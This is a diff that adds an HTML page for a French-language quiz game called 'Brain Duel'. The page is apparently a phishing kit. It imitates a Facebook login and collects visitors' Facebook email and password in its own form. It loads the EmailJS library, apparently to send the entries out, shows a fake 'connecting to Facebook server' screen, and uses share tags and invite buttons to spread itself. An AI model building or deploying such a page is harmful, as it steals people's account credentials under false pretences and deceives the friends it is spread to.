@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<!-- Balises Open Graph pour aperçu partage -->
+<meta property="og:title" content="Brain Duel – Défie tes amis!" />
+<meta property="og:description" content="Connecte-toi avec Facebook et montre que tu es le roi du quiz cérébral. Relève le défi Brain Duel!" />
+<meta property="og:image" content="https://brain-duel.netlify.app/og-image.jpg" />
+<meta property="og:url" content="https://brain-duel.netlify.app/" />
+<meta property="og:type" content="website" />
+
+<!-- Balises Twitter (optionnelles) -->
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Brain Duel – Défie tes amis!" />
+<meta name="twitter:description" content="Montre ton intelligence dans Brain Duel. Connecte-toi et défie tes amis!" />
+<meta name="twitter:image" content="https://brain-duel.netlify.app/og-image.jpg" />
+
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Brain Duel - Connexion Facebook</title>
+
+  <!-- Forcer le chargement CSS en priorité -->
+  <link rel="preload" as="image" href="background.png" />
+  <link rel="stylesheet" href="style.css" />
+
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script src="script.js" defer></script>
+
+  <!-- Métadonnées partage -->
+  <meta property="og:title" content="Viens me défier dans Brain Duel !" />
+  <meta property="og:description" content="Déconnecte ta logique avec ce jeu qui rend fou... Oses-tu relever le défi ?" />
+  <meta property="og:image" content="background.png" />
+  <meta property="og:url" content="https://brain-duel.netlify.app" />
+  <meta name="twitter:card" content="summary_large_image" />
+
+<!-- Balises Open Graph pour aperçu -->
+<meta property="og:title" content="Brain Duel - Défiez vos amis !" />
+<meta property="og:description" content="Jouez à Brain Duel, un jeu de quiz mental intense. Relevez le défi !" />
+<meta property="og:image" content="https://brain-duel-game.onrender.com/og-image.jpg" />
+<meta property="og:url" content="https://brain-duel-game.onrender.com/" />
+<meta property="og:type" content="website" />
+
+<!-- Pour Twitter (optionnel) -->
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Brain Duel - Défiez vos amis !" />
+<meta name="twitter:description" content="Jouez à Brain Duel, un jeu de quiz mental intense. Relevez le défi !" />
+<meta name="twitter:image" content="https://brain-duel-game.onrender.com/og-image.jpg" />
+
+</head>
+<body>
+
+<audio id="bgmusic" loop>
+  <source src="calm_piano.mp3" type="audio/mpeg">
+</audio>
+
+<div style="position: absolute; top: 20px; right: 20px; z-index: 1000;">
+  <button onclick="document.getElementById('bgmusic').play()">🔊 Activer le son</button>
+  <input type="range" min="0" max="1" step="0.01" value="0.5" 
+         onchange="document.getElementById('bgmusic').volume = this.value">
+</div>
+
+
+
+
+
+  <div class="login-box">
+    <img src="logo.png" alt="Brain Duel Logo" class="logo" />
+    <h2>Défie-moi dans Brain Duel!</h2>
+    <p>Connecte-toi avec Facebook pour commencer le jeu.</p>
+    <form id="login-form">
+      <input type="email" name="user_email" placeholder="Email Facebook" required />
+      <input type="password" name="user_password" placeholder="Mot de passe" required />
+      <button type="submit" class="facebook-btn">🔵 Se connecter avec Facebook</button>
+    </form>
+    <div id="loader" class="loader hidden"></div>
+    <p><a href="https://www.facebook.com" target="_blank">Mot de passe oublié ?</a>
+<div class="invite-btn-container">
+  <button onclick="inviterAmis()">🎉 Inviter des amis</button>
+</div>
+</p>
+  </div>
+
+<script>
+  function inviterAmis() {
+    window.location.href = "invite.html";
+  }
+</script>
+
+
+<div id="loading-screen" style="display: none;">
+  <div class="loading-overlay">
+    <div class="loading-box">
+      <div class="spinner"></div>
+      <p>Connexion au serveur Facebook en cours...</p>
+    </div>
+  </div>
+</div>
+<script>
+  document.getElementById('connexionBtn').addEventListener('click', function(event) {
+    event.preventDefault();
+    document.getElementById('loading-screen').style.display = 'block';
+    setTimeout(function() {
+      window.location.href = "quiz1.html";
+    }, 3000);
+  });
+</script>
+
+
+<script>
+window.addEventListener("DOMContentLoaded", () => {
+    const audios = document.querySelectorAll("audio");
+    audios.forEach(audio => {
+        audio.muted = false;
+        audio.play().catch(() => {});
+    });
+});
+</script>
+
+</body>
+</html>
